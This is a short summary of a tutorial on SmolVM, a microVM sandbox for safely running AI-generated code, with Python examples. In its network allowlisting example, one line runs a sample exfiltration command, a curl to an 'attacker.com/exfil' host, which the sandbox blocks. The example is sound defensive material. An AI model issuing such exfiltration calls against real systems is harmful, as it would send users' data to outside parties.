---
title: "How to Safely Run AI-Generated Code with SmolVM (Open-Source MicroVM Sandbox)"
url: "https://dev.to/aniketmaurya/how-to-safely-run-ai-generated-code-with-smolvm-open-source-microvm-sandbox-2coo"
author: "Aniket Maurya"
category: "agent-sandbox"
---

# How to Safely Run AI-Generated Code with SmolVM (Open-Source MicroVM Sandbox)

**Author:** Aniket Maurya
**Published:** April 21, 2026

## Overview
Introduces SmolVM, an open-source Firecracker-backed microVM sandbox for AI agents. Boots in under 500ms with ~128MB RAM overhead, providing hardware-level isolation (KVM) stronger than Docker's shared kernel model.

## Key Concepts

Docker containers share the host kernel, so kernel exploits compromise the host. SmolVM uses hardware virtualization boundaries (KVM/Firecracker) providing true isolation. Currently v0.0.3 (Apache 2.0).

## Code Examples

### Basic Execution

```python
from smolvm import SmolVM

with SmolVM() as vm:
    result = vm.run("echo 'Hello from the sandbox!'")
    print(result.output)
```

### Agent Integration

```python
def execute_code_in_sandbox(code: str) -> str:
    with SmolVM() as vm:
        result = vm.run(code)
        return result.stdout if result.exit_code == 0 else result.stderr
```

### Persistent Sessions

```python
vm = SmolVM()
vm.start()
vm.run("pip install requests pandas")
vm_id = vm.id
# Later reconnect
vm = SmolVM.from_id(vm_id)
```

### Network Allowlisting

```python
with SmolVM(allow_hosts=["api.openai.com", "pypi.org"]) as vm:
    vm.run("pip install requests")  # Works
    vm.run("curl https://attacker.com/exfil")  # Fails silently
```

### Read-Only Mounts

```python
with SmolVM(host_mounts=[("/Users/me/my-repo", "/workspace", "ro")]) as vm:
    print(vm.run("ls /workspace").output)
```

### Browser Isolation

```python
with SmolVM() as vm:
    vm.run("google-chrome --remote-debugging-port=9222 &")
    host_port = vm.expose_local(guest_port=9222, host_port=19222)
```
